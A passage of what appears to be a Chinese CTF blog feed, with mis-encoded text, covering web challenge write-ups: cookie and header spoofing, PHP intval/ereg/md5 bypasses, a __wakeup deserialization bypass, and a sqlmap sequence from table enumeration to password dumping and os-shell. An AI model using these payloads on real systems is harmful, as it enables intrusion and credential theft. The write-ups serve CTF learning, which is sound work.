<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p> <strong>Cookieï¼Œæœ‰æ—¶ä¹Ÿç”¨å…¶å¤æ•°å½¢å¼ <a href="https://baike.baidu.com/item/Cookies/187064" target="_blank" rel="noopener">Cookies</a>ã€‚ç±»å‹ä¸ºâ€œ</strong>å°å‹æ–‡æœ¬æ–‡ä»¶<strong>â€ï¼Œæ˜¯æŸäº›ç½‘ç«™ä¸ºäº†è¾¨åˆ«ç”¨æˆ·èº«ä»½ï¼Œè¿›è¡Œ<a href="https://baike.baidu.com/item/Session/479100" target="_blank" rel="noopener">Session</a>è·Ÿè¸ªè€Œå‚¨å­˜åœ¨ç”¨æˆ·æœ¬åœ°ç»ˆç«¯ä¸Šçš„æ•°æ®ï¼ˆé€šå¸¸ç»è¿‡åŠ å¯†ï¼‰ï¼Œç”±ç”¨æˆ·<a href="https://baike.baidu.com/item/å®¢æˆ·ç«¯/101081" target="_blank" rel="noopener">å®¢æˆ·ç«¯</a>è®¡ç®—æœºæš‚æ—¶æˆ–æ°¸ä¹…ä¿å­˜çš„ä¿¡æ¯ ã€‚</strong></p>
<p> <strong>TIP: 0==not</strong> </p>
<p>bpæŠ“åŒ…ï¼Œå°†<code>cookie:login = 0</code>æ”¹<code>cookie:login=1</code> go</p>
<p><img src="/2020/08/29/nctf/cookie.png" srcset="/img/loading.gif" alt></p>
<h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p>è¿›å…¥é¢˜ç›®ï¼Œæç¤ºrobotsåè®®</p>
<p><strong>robotsåè®®ä¹Ÿå«robots.txtï¼ˆç»Ÿä¸€å°å†™ï¼‰æ˜¯ä¸€ç§å­˜æ”¾äº<a href="https://baike.baidu.com/item/ç½‘ç«™" target="_blank" rel="noopener">ç½‘ç«™</a>æ ¹ç›®å½•ä¸‹çš„<a href="https://baike.baidu.com/item/ASCII" target="_blank" rel="noopener">ASCII</a>ç¼–ç çš„<a href="https://baike.baidu.com/item/æ–‡æœ¬æ–‡ä»¶" target="_blank" rel="noopener">æ–‡æœ¬æ–‡ä»¶</a>ï¼Œå®ƒé€šå¸¸å‘Šè¯‰ç½‘ç»œ<a href="https://baike.baidu.com/item/æœç´¢å¼•æ“" target="_blank" rel="noopener">æœç´¢å¼•æ“</a>çš„æ¼«æ¸¸å™¨ï¼ˆåˆç§°<a href="https://baike.baidu.com/item/ç½‘ç»œèœ˜è››" target="_blank" rel="noopener">ç½‘ç»œèœ˜è››</a>ï¼‰ï¼Œæ­¤ç½‘ç«™ä¸­çš„å“ªäº›å†…å®¹æ˜¯ä¸åº”è¢«æœç´¢å¼•æ“çš„æ¼«æ¸¸å™¨è·å–çš„ï¼Œå“ªäº›æ˜¯å¯ä»¥è¢«æ¼«æ¸¸å™¨è·å–çš„ã€‚å› ä¸ºä¸€äº›ç³»ç»Ÿä¸­çš„URLæ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼Œæ‰€ä»¥robots.txtçš„æ–‡ä»¶ååº”ç»Ÿä¸€ä¸ºå°å†™ã€‚robots.txtåº”æ”¾ç½®äºç½‘ç«™çš„æ ¹ç›®å½•ä¸‹ã€‚å¦‚æœæƒ³å•ç‹¬å®šä¹‰æœç´¢å¼•æ“çš„æ¼«æ¸¸å™¨è®¿é—®å­ç›®å½•æ—¶çš„è¡Œä¸ºï¼Œé‚£ä¹ˆå¯ä»¥å°†è‡ªå®šçš„è®¾ç½®åˆå¹¶åˆ°æ ¹ç›®å½•ä¸‹çš„robots.txtï¼Œæˆ–è€…ä½¿ç”¨robots<a href="https://baike.baidu.com/item/å…ƒæ•°æ®" target="_blank" rel="noopener">å…ƒæ•°æ®</a>ï¼ˆMetadataï¼Œåˆç§°å…ƒæ•°æ®ï¼‰ã€‚</strong></p>
<p><strong>robotsåè®®å¹¶ä¸æ˜¯ä¸€ä¸ªè§„èŒƒï¼Œè€Œåªæ˜¯çº¦å®šä¿—æˆçš„ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½ä¿è¯ç½‘ç«™çš„éšç§ã€‚</strong></p>
<p>æŸ¥çœ‹robots.txt</p>
<p>url:<code>http://chinalover.sinaapp.com/web11/robots.txt</code></p>
<div class="hljs"><pre><code class="hljs php">TIP:sql.php
<span class="hljs-comment">//è¿™é‡Œæç¤ºsql.phpçš„æºç å¦‚ä¸‹</span></code></pre></div>

<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>($_GET[id]) &#123;
   mysql_connect(SAE_MYSQL_HOST_M . <span class="hljs-string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $id = intval($_GET[id]);
  $query = @mysql_fetch_array(mysql_query(<span class="hljs-string">"select content from ctf2 where id='$id'"</span>));
  <span class="hljs-keyword">if</span> ($_GET[id]==<span class="hljs-number">1024</span>) &#123;
      <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;
  &#125;
  <span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">echo</span>($query[content]);
  &#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>å¤§è‡´æ„æ€ï¼šgetæ–¹å¼ä¼ é€’ä¸€ä¸ªidçš„å‚æ•°,åˆ›å»ºä¸€ä¸ªæ–°çš„å‚æ•°idå­˜æ”¾å–æ•´åçš„å€¼ï¼ˆintval()å‡½æ•°å°†å‚æ•°å˜ä¸ºæ•´å½¢ï¼‰</p>
<p>ä¹‹åå°†æ–°çš„$idå¸¦å…¥sqlè¯­å¥ä¸­æŸ¥è¯¢ã€‚ifè¯­å¥ä¸­è¯´æ˜ï¼Œgetæ–¹å¼ä¼ é€’çš„å€¼ä¸èƒ½ä¸º1024ã€‚</p>
<p> <a href="http://chinalover.sinaapp.com/web11/sql.php?id=10" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web11/sql.php?id=10</a> å°è¯•id=10ï¼Œæ— ç»“æœ</p>
<p>id=1024å‡ºç° no! try againï¼Œè¯´æ˜åªæœ‰id=1024çš„æ—¶å€™æ‰ä¼šæ‰§è¡Œifè¯­å¥</p>
<p>æƒ³åˆ°äº†intval()å‡½æ•°çš„ä½œç”¨ï¼Œå°è¯•id=1024.1</p>
<h2 id="GBK-Injection"><a href="#GBK-Injection" class="headerlink" title="GBK Injection"></a>GBK Injection</h2><p>å®½å­—èŠ‚æ³¨å…¥ï¼Œä¹‹å‰å†™è¿‡ã€‚</p>
<h2 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'nctf'</span>])) &#123;
       <span class="hljs-keyword">if</span> (@ereg (<span class="hljs-string">"^[1-9]+$"</span>, $_GET[<span class="hljs-string">'nctf'</span>]) === <span class="hljs-keyword">FALSE</span>)
           <span class="hljs-keyword">echo</span> <span class="hljs-string">'å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ'</span>;
       <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'nctf'</span>], <span class="hljs-string">'#biubiubiu'</span>) !== <span class="hljs-keyword">FALSE</span>)   
           <span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);
       <span class="hljs-keyword">else</span>
           <span class="hljs-keyword">echo</span> <span class="hljs-string">'éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~'</span>;
   &#125;</code></pre></div>

<p>è¯•äº†è¯•<code>?nctf[]=1</code>,å‡ºç°äº†æŠ¥é”™ä½†æ˜¯ç­”æ¡ˆçœŸå°±å‡ºæ¥äº†</p>
<p>æ­£å„¿å…«ç»çš„åšæ³•æ˜¯<code>?nctf=1%00%23biubiubiu</code>ï¼Œç®€å•çš„ä»£ç å®¡è®¡</p>
<h2 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'a'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'b'</span>]))
&#123;
<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'a'</span>] != $_GET[<span class="hljs-string">'b'</span>])
<span class="hljs-keyword">if</span> (md5($_GET[<span class="hljs-string">'a'</span>]) == md5($_GET[<span class="hljs-string">'b'</span>]))
<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);
<span class="hljs-keyword">else</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">'Wrong.'</span>;
&#125; 
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>ä»£ç å®¡è®¡ï¼Œgetæ–¹å¼ä¼ é€’å‚æ•°aå’Œb,äºŒè€…çš„å€¼ä¸åŒï¼Œä½†æ˜¯md5å€¼ä¸åŒï¼Œæ­¤å¤„åˆåˆ©ç”¨md5()æ¼æ´</p>
<p> <strong>åœ¨PHPä¸­ï¼ŒMD5æ˜¯ä¸èƒ½å¤„ç†æ•°ç»„çš„ï¼Œmd5(æ•°ç»„)ä¼šè¿”å›nullï¼Œæ‰€ä»¥md5(a[])null,md5(b[])nullï¼Œmd5(a[])=md5(b[])=null,è¿™æ ·å°±å¾—åˆ°ç­”æ¡ˆäº†ã€‚</strong> </p>
<p>payload:</p>
<p> <code>http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=3</code> </p>
<h2 id="ä¼ªè£…è€…"><a href="#ä¼ªè£…è€…" class="headerlink" title="ä¼ªè£…è€…"></a>ä¼ªè£…è€…</h2><p>bpæŠ“åŒ…ï¼Œæ·»åŠ <code>X-Forwarded-For=127.0.0.1</code>,å‘åŒ…å³å¯</p>
<p> <strong>X-Forwarded-Forï¼ˆXFFï¼‰æ˜¯ç”¨æ¥è¯†åˆ«é€šè¿‡HTTPä»£ç†æˆ–è´Ÿè½½å‡è¡¡æ–¹å¼è¿æ¥åˆ°WebæœåŠ¡å™¨çš„å®¢æˆ·ç«¯æœ€åŸå§‹çš„IPåœ°å€çš„HTTPè¯·æ±‚å¤´å­—æ®µ</strong> </p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>md5</tag>
        <tag>sql</tag>
        <tag>ä»£ç å®¡è®¡</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>ååºåˆ—åŒ–</title>
    <url>/2020/03/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>ååºåˆ—åŒ–</p>
<a id="more"></a>
<p>PHPé­”æœ¯æ–¹æ³•_ wakeup()æ˜¯åœ¨ååºåˆ—åŒ–æ“ä½œä¸­èµ·ä½œç”¨çš„é­”æ³•å‡½æ•°ï¼Œ å½“unserializeçš„æ—¶å€™ï¼Œ ä¼šæ£€æŸ¥æ—¶å€™å­˜åœ¨ __ wakeup()å‡½æ•°, å¦‚æœå­˜åœ¨çš„è¯ï¼Œä¼šä¼˜å…ˆè°ƒç”¨__wakeup()å‡½æ•°ã€‚ </p>
<p>è€Œ<strong>wakeup()å‡½æ•°æ¼æ´å°±æ˜¯ä¸å¯¹è±¡çš„å±æ€§ä¸ªæ•°æœ‰å…³ï¼Œå¦‚æœåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå±æ€§ä¸ªæ•°çš„æ•°å­—ä¸çœŸå®å±æ€§ä¸ªæ•°ä¸€è‡´ï¼Œé‚£ä¹ˆå°±è°ƒç”¨</strong>wakeup()å‡½æ•°, å¦‚æœè¯¥æ•°å­—å¤§äºçœŸå®å±æ€§ä¸ªæ•°ï¼Œå°±ä¼šç»•è¿‡__wakeup()å‡½æ•°ã€‚</p>
<p>serialize()å‡½æ•°ï¼šç”¨äºåºåˆ—åŒ–å¯¹è±¡æˆ–æ•°ç»„ï¼Œå¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚åºåˆ—åŒ–å¯¹è±¡åï¼Œ å¯ä»¥å¾ˆæ–¹ä¾¿çš„å°†å®ƒä¼ é€’ç»™å…¶ä»–éœ€è¦å®ƒçš„åœ°æ–¹ï¼Œä¸”å…¶ç±»å‹å’Œç»“æ„ä¸ä¼šæ”¹å˜ã€‚</p>
<p>unserialize()å‡½æ•°ï¼šç”¨äºå°†é€šè¿‡serialize()å‡½æ•°åºåˆ—åŒ–åçš„å¯¹è±¡æˆ–æ•°ç»„è¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶è¿”å›åŸå§‹çš„å¯¹è±¡ç»“æ„ã€‚</p>
<p>ä¸¾ä¾‹è¯´æ˜</p>
<div class="hljs"><pre><code>&lt;?php
class Student{
public $full_name = &apos;zhangsan&apos;;
public $score = 150;
public $grades = array();

function __wakeup() {
echo &quot;__wakeup is invoked&quot;;
}
}

$s = new Student();
var_dump(serialize($s));
?&gt;</code></pre></div><hr>
<div class="hljs"><pre><code>O:7:&quot;Student&quot;:3:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}</code></pre></div><p>å„ä¸ªç¬¦å·çš„å«ä¹‰<br><strong>å˜é‡ç±»å‹ï¼šç±»åé•¿åº¦ï¼ˆå­—èŠ‚ï¼‰ï¼šç±»åï¼šå±æ€§æ•°é‡ï¼š{å±æ€§åç±»å‹ï¼šå±æ€§åé•¿åº¦ï¼šå±æ€§åï¼šå±æ€§å€¼ç±»å‹ï¼šå±æ€§å€¼é•¿åº¦ï¼šå±æ€§å€¼å†…å®¹}</strong></p>
<p>å…¶ä¸­åœ¨Stuedentç±»åé¢æœ‰ä¸€ä¸ªæ•°å­—3ï¼Œæ•´ä¸ª3è¡¨ç¤ºçš„å°±æ˜¯Studentç±»å­˜åœ¨3ä¸ªå±æ€§ã€‚<br>wakeup()æ¼æ´å°±æ˜¯ä¸æ•´ä¸ªå±æ€§ä¸ªæ•°å€¼æœ‰å…³ã€‚<strong>å½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡wakeupçš„æ‰§è¡Œã€‚</strong></p>
<p>å½“æˆ‘ä»¬å°†ä¸Šè¿°çš„åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­çš„å¯¹è±¡å±æ€§ä¸ªæ•°ä¿®æ”¹ä¸º5ï¼Œå˜ä¸º<br>O:7:â€Studentâ€:5:{s:9:â€full_nameâ€;s:8:â€zhangsanâ€;s:5:â€scoreâ€;i:150;s:6:â€gradesâ€;a:0:{}}</p>
<p>æœ€åæ‰§è¡Œè¿è¡Œçš„ä»£ç å¦‚ä¸‹:</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span></span>&#123;
<span class="hljs-keyword">public</span> $full_name = <span class="hljs-string">'zhangsan'</span>;
<span class="hljs-keyword">public</span> $score = <span class="hljs-number">150</span>;
<span class="hljs-keyword">public</span> $grades = <span class="hljs-keyword">array</span>();

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span> </span>&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"__wakeup is invoked"</span>;
&#125;
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;
var_dump(<span class="hljs-keyword">$this</span>);
&#125;
&#125;

$s = <span class="hljs-keyword">new</span> Student();
$stu = unserialize(<span class="hljs-string">'O:7:"Student":5:&#123;s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:&#123;&#125;&#125;'</span>);
<span class="hljs-meta">?&gt;</span></code></pre></div>


<h2 id="ä¸¾ä¾‹è¯´æ˜"><a href="#ä¸¾ä¾‹è¯´æ˜" class="headerlink" title="ä¸¾ä¾‹è¯´æ˜"></a>ä¸¾ä¾‹è¯´æ˜</h2><p>é¢˜ç›®</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;
<span class="hljs-keyword">public</span> $flag = <span class="hljs-string">'111'</span>;
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;
<span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);
&#125;
?code=</code></pre></div>

<hr>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;  <span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªåä¸ºxctfçš„ç±»</span>
<span class="hljs-keyword">public</span> $flag = <span class="hljs-string">'111'</span>;<span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªå…¬æœ‰çš„ç±»å±æ€§$flagï¼Œå€¼ä¸º111</span>
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªå…¬æœ‰çš„ç±»æ–¹æ³•__wakeup()ï¼Œè¾“å‡ºbad requestsåé€€å‡ºå½“å‰è„šæœ¬</span>
<span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);
&#125;
&#125;
$test = <span class="hljs-keyword">new</span> xctf();   <span class="hljs-comment">//ä½¿ç”¨newè¿ç®—ç¬¦æ¥å®ä¾‹åŒ–è¯¥ç±»ï¼ˆxctfï¼‰çš„å¯¹è±¡ä¸ºtest</span>
<span class="hljs-keyword">echo</span>(serialize($test));   <span class="hljs-comment">//è¾“å‡ºè¢«åºåˆ—åŒ–çš„å¯¹è±¡ï¼ˆtestï¼‰</span>
<span class="hljs-meta">?&gt;</span></code></pre></div>
<p>è¾“å‡ºç»“æœ</p>
<div class="hljs"><pre><code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></pre></div><p>æˆ‘ä»¬è¦ååºåˆ—åŒ–xctfç±»çš„åŒæ—¶è¿˜è¦ç»•è¿‡wakeupæ–¹æ³•çš„æ‰§è¡Œï¼ˆå¦‚æœä¸ç»•è¿‡wakeup()æ–¹æ³•ï¼Œé‚£ä¹ˆå°†ä¼šè¾“å‡ºbad requestså¹¶é€€å‡ºè„šæœ¬ï¼‰ï¼Œwakeup()å‡½æ•°æ¼æ´åŸç†ï¼šå½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡wakeupçš„æ‰§è¡Œã€‚å› æ­¤ï¼Œéœ€è¦ä¿®æ”¹åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­çš„å±æ€§ä¸ªæ•°ï¼š<br>å½“æˆ‘ä»¬å°†ä¸Šè¿°çš„åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­çš„å¯¹è±¡å±æ€§ä¸ªæ•°ç”±çœŸå®å€¼1ä¿®æ”¹ä¸º2ï¼Œå³å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<div class="hljs"><pre><code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></pre></div><p>è®¿é—®url?code=O:4:â€xctfâ€:2:{s:4:â€flagâ€;s:3:â€111â€;}</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap</title>
    <url>/2020/07/18/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="sqlmapä½¿ç”¨"><a href="#sqlmapä½¿ç”¨" class="headerlink" title="sqlmapä½¿ç”¨"></a>sqlmapä½¿ç”¨</h1><a id="more"></a>

<p>ç¬¬ä¸€æ­¥:</p>
<div class="hljs"><pre><code>-u &quot;xxâ€ --cookie= &quot;yyy&quot; //å¸¦ä¸Šcookieå¯¹URLè¿›è¡Œæ³¨å…¥æ¢æµ‹</code></pre></div><p>ç¬¬äºŒæ­¥:</p>
<div class="hljs"><pre><code>-u &quot;xxxâ€ --cookie= &quot;yy&quot; - current--db //å¯¹æ•°æ®åº“åè¿›è¡Œè·å–</code></pre></div><p>ç¬¬ä¸‰æ­¥:</p>
<div class="hljs"><pre><code>-u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //å¯¹æ•°æ®åº“dvwaçš„è¡¨åè¿›è¡Œæšä¸¾</code></pre></div><p>ç¬¬å››æ­¥:</p>
<div class="hljs"><pre><code>-u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //å¯¹dvwaåº“é‡Œé¢çš„åä¸ºusersè¡¨çš„åˆ—åè¿›è¡Œæšä¸¾</code></pre></div><p>ç¬¬äº”æ­¥:</p>
<div class="hljs"><pre><code>-u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump
//æ¢æµ‹userè¡¨nameå’Œpasswordå­—æ®µ</code></pre></div><p>å¦‚æœæ­¤æ—¶å¾—åˆ°çš„å¯†ç ä¸ºå¯†æ–‡, SQLmapä¼šè‡ªåŠ¨è¯¢é—®ï¼Œæ˜¯å¦çˆ†ç ´,é€‰æ‹©â€æ˜¯â€å³å¯å¼€å§‹ä½¿ç”¨SQLMAPè‡ªå¸¦çš„å­—<br>å…¸è¿›è¡Œçˆ†ç ´ã€‚</p>
<p>ç¬¬å…­æ­¥:</p>
<div class="hljs"><pre><code>-u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //è·å–shell,é€‰æ‹©åå°è¯­è¨€</code></pre></div><h1 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h1><p>order by * </p>
<p>group by *</p>
<p>åˆ©ç”¨å†…ç½®å‡½æ•°æš´æ•°æ®åº“ä¿¡æ¯</p>
<p>version() æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬</p>
<p>database() æŸ¥çœ‹å½“å‰æ•°æ®åº“å</p>
<p>user() æŸ¥çœ‹å½“å‰ç”¨æˆ·</p>
<p>æŸ¥çœ‹è¡¨ï¼š</p>
<div class="hljs"><pre><code>Select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()  </code></pre></div><p>å¯åå…­è¿›åˆ¶æŸ¥çœ‹å­—æ®µï¼š</p>
<div class="hljs"><pre><code>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=â€˜biaomingâ€™;</code></pre></div>]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>bugkuåˆ·é¢˜è®°å½•2</title>
    <url>/2020/09/10/bugku1/</url>
    <content><![CDATA[<h1 id="bugkuåˆ·é¢˜è®°å½•2"><a href="#bugkuåˆ·é¢˜è®°å½•2" class="headerlink" title="bugkuåˆ·é¢˜è®°å½•2"></a>bugkuåˆ·é¢˜è®°å½•2</h1><a id="more"></a>





<h2 id="é€Ÿåº¦è¦å¿«"><a href="#é€Ÿåº¦è¦å¿«" class="headerlink" title="é€Ÿåº¦è¦å¿«"></a>é€Ÿåº¦è¦å¿«</h2><p>æ‰“å¼€é¡µé¢æŸ¥çœ‹æºç ä»€ä¹ˆä¹Ÿæ²¡æœ‰</p>
<p>æŠ“åŒ…çœ‹äº†çœ‹ï¼ŒæƒŠå–œçš„å‘ç°äº†flagå­—æ®µ</p>
<p><img src="/2020/09/10/bugku1/%E9%80%9F%E5%BA%A61.png" srcset="/img/loading.gif" alt></p>
<p>ä¸€æ®µbase64 è§£ç åä¸º<code>NDQyMDIy</code></p>
<p>æäº¤å‘ç°å¹¶ä¸å¯¹ã€‚ã€‚ã€‚çœ‹æ¥å¦æœ‰ç„æœº</p>
<p>å¤šgoå‡ æ¬¡åå‘ç°äº†flagå€¼ä¸€ç›´åœ¨å˜ï¼Œå¹¶ä¸”æœ‰ä¸€æ®µæç¤º</p>
<p><code>&lt;!-- OK ,now you have to post the margin what you find --&gt;</code></p>
<p>ç”¨postæ–¹æ³•æäº¤ä½ æ‰€å‘ç°çš„å†…å®¹ï¼Œåªå¥½ä½¿ç”¨è„šæœ¬ï¼ˆä¸ä¼šå†™ï¼‰</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> base64
url=<span class="hljs-string">"http://120.24.86.145:8002/web6/"</span>
r=requests.session()
headers=r.get(url).headers<span class="hljs-comment">#å› ä¸ºflagåœ¨æ¶ˆæ¯å¤´é‡Œ</span>
 
mid=base64.b64decode(headers[<span class="hljs-string">'flag'</span>])
mid=mid.decode()<span class="hljs-comment">#ä¸ºäº†ä¸‹ä¸€æ­¥ç”¨splitä¸æŠ¥é”™ï¼Œb64decodeåæ“ä½œçš„å¯¹è±¡æ˜¯byteç±»å‹çš„å­—ç¬¦ä¸²ï¼Œè€Œsplitå‡½æ•°è¦ç”¨strç±»å‹çš„</span>
 
flag = base64.b64decode(mid.split(<span class="hljs-string">':'</span>)[<span class="hljs-number">1</span>])<span class="hljs-comment">#è·å¾—flag:åçš„å€¼</span>
data=&#123;<span class="hljs-string">'margin'</span>:flag&#125;
<span class="hljs-keyword">print</span> (r.post(url,data).text)<span class="hljs-comment">#postæ–¹æ³•ä¼ ä¸Šå»</span></code></pre></div>

<p><img src="/2020/09/10/bugku1/headers.png" srcset="/img/loading.gif" alt></p>
<h2 id="cookieæ¬ºéª—"><a href="#cookieæ¬ºéª—" class="headerlink" title="cookieæ¬ºéª—"></a>cookieæ¬ºéª—</h2><p>æ³¨æ„è§‚å¯Ÿurl<code>http://123.206.87.240:8002/web11/index.php?line=2&amp;filename=a2V5cy50eHQ=</code></p>
<p>line=2&amp;filename=a2V5cy50eHQ=</p>
<p><code>a2V5cy50eHQ=</code> è§£å¯†æ˜¯ä¸ºkey.txt   lineæ˜¯è¡Œçš„æ„æ€ï¼Œè¿™é‡Œåº”è¯¥æ˜¯æŸ¥çœ‹key.txtçš„ç¬¬lineè¡Œçš„ä»£ç </p>
<p>è¿™é‡Œå¯ä»¥æŸ¥çœ‹<code>index.php</code>æºç   index.phpçš„base64å€¼ä¸º<code>aW5kZXgucGhw</code></p>
<p><img src="/2020/09/10/bugku1/cookie1.png" srcset="/img/loading.gif" alt></p>
<p>æ”¹å˜lineçš„å€¼å¯ä»¥ä¸€è¡Œä¸€è¡Œçš„æŸ¥çœ‹æºç ï¼Œå¯ä»¥ä½¿ç”¨è„šæœ¬</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
url1 = <span class="hljs-string">"http://123.206.87.240:8002/web11/index.php?line="</span>
url2 = <span class="hljs-string">"&amp;filename=aW5kZXgucGhw"</span>
mysession = requests.session()
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">40</span>):    
    r = mysession.get(url1+str(i)+url2)    
print(r.text)</code></pre></div>

<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

error_reporting(<span class="hljs-number">0</span>);

$file=base64_decode(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'filename'</span>])?$_GET[<span class="hljs-string">'filename'</span>]:<span class="hljs-string">""</span>);

$line=<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'line'</span>])?intval($_GET[<span class="hljs-string">'line'</span>]):<span class="hljs-number">0</span>;

<span class="hljs-keyword">if</span>($file==<span class="hljs-string">''</span>) header(<span class="hljs-string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);

$file_list = <span class="hljs-keyword">array</span>(

<span class="hljs-string">'0'</span> =&gt;<span class="hljs-string">'keys.txt'</span>,

<span class="hljs-string">'1'</span> =&gt;<span class="hljs-string">'index.php'</span>,

);

 

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="hljs-string">'margin'</span>]==<span class="hljs-string">'margin'</span>)&#123;       <span class="hljs-comment">//çœ‹è¿™é‡Œ</span>

$file_list[<span class="hljs-number">2</span>]=<span class="hljs-string">'keys.php'</span>;

&#125;

 

<span class="hljs-keyword">if</span>(in_array($file, $file_list))&#123;

$fa = file($file);

<span class="hljs-keyword">echo</span> $fa[$line];

&#125;

<span class="hljs-meta">?&gt;</span></code></pre></div>



<p><code>if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;)</code></p>
<p> è¿™é‡Œå¯ä»¥åˆ¤æ–­cookieå¿…é¡»æ»¡è¶³margin=marginæ‰èƒ½è®¿é—®keys.php</p>
<p><img src="/2020/09/10/bugku1/cookie2.png" srcset="/img/loading.gif" alt="bp"></p>
